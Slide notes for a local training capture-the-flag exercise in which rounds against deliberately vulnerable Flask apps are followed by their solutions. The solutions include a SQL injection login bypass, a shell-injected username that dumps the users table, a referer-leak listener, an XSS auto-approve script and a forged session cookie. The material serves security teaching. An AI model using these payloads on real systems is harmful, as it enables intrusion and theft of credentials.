## Marketplace CTF



## What is it?
Find security holes in apps.

Multiple rounds getting harder each round.

Around 15 mins per round.

Followed by discussion.



## Don't worry
If you can't get the answers.

Learning and actually doing vulnerabilities is the point of this.



## To run
Set up a python virtualenv (eg: marketplace-ctf)

Install:

```bash
pip install Flask
pip install python-memcached
pip install requests
```



## Also
Optional:

```bash
brew install phantomjs
```



## Although...
All things are local and you could just open the db or the secret file or whatever... and read it.

That's not really the point is it?



## Do not
DOS

rm -rf

Be a meanie



## Round 1
My cool app requires a username and password to get in. It's really, really well protected (not).

Goal: **Log in**



## Round 1
SQL Injection

set password to:

```sql
' OR '1
```



## Round 2
The admin user keeps forgetting their password. So I added a hint to remind them.

Goal: **Log in**



## Round 2
Shell injection

set username to:

```bash
admin;sqlite3 the.db "SELECT * FROM users";#
```



## Round 3
We've written this cool way to review web apps. Add an app as some JSON and reviewers will access the review page. Reviewers will visit any URL given in the JSON.

Goal: **Access the review page**



## Round 3
Referer leaking

upload an app format:

```json
{"url": "http://localhost:9999"}
```



## Round 3
Then run a server that looks like this:

```python
from flask import Flask, request
app = Flask(__name__)

@app.route('/')
def test():
    print request.headers
    return 'done'

if __name__ == '__main__':
    app.debug = True
    app.run(host='0.0.0.0', port=9999)
```



## Round 3
HTTPS > HTTP *No referrer*

HTTPS > HTTPS *Referrer shown*

https://bugzilla.mozilla.org/show_bug.cgi?id=704320

http://smerity.com/articles/2013/where_did_all_the_http_referrers_go.html



## Round 4
So we've closed down the whole in Round 3. And added a description field where you can add some HTML. Also actually added a working Approve and Deny button.

Goal: **Approve your app**



## Round 4
XSS

```json
{"url": "http://foo.com",
"description": "&lt;script>window.onload = function() {
    document.getElementsByTagName('input')[1].click();
}&lt;/script>"}
```

* Note: < should not be escaped, but markdown to reveal.js hates me.



## Round 5
This is really similar to round 1, except without the SQL Injection.

Goal: **Get logged in**



## Round 5
Fake cookie

```python
import hashlib

import requests
from flask.sessions import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer

url = URLSafeTimedSerializer('is-it-really-bad-if-this-is-shared',
                             salt='cookie-session',
                             serializer=TaggedJSONSerializer(),
                             signer_kwargs={'key_derivation': 'hmac',
                                            'digest_method': hashlib.sha1})

cookie = url.dumps({'user': 'admin'})
res = requests.get('http://localhost:5000', cookies={'session': cookie })
assert 'So logged in' in res.text
```



## Round 6
To come



## Round 7
This one is homework, give it a try if you like, not for today.




## Security bugs
There is a classification of security bugs.

https://wiki.mozilla.org/Security_Severity_Ratings

A very small portion of security bugs use this clasification, we should do that more.



## By category
- wsec-authentication: 4
- wsec-authorization: 0
- wsec-cookie: 1
- wsec-crossdomain: 1
- wsec-crypto: 1
- **wsec-csrf: 11**
- wsec-disclosure: 2
- wsec-dos: 1
- wsec-errorhandling: 1
- wsec-impersonation: 4
- wsec-injection: 0
- wsec-input: 0
- wsec-logging: 0
- wsec-other: 6
- wsec-session: 1
- wsec-sqli: 0
- **wsec-xss: 33**
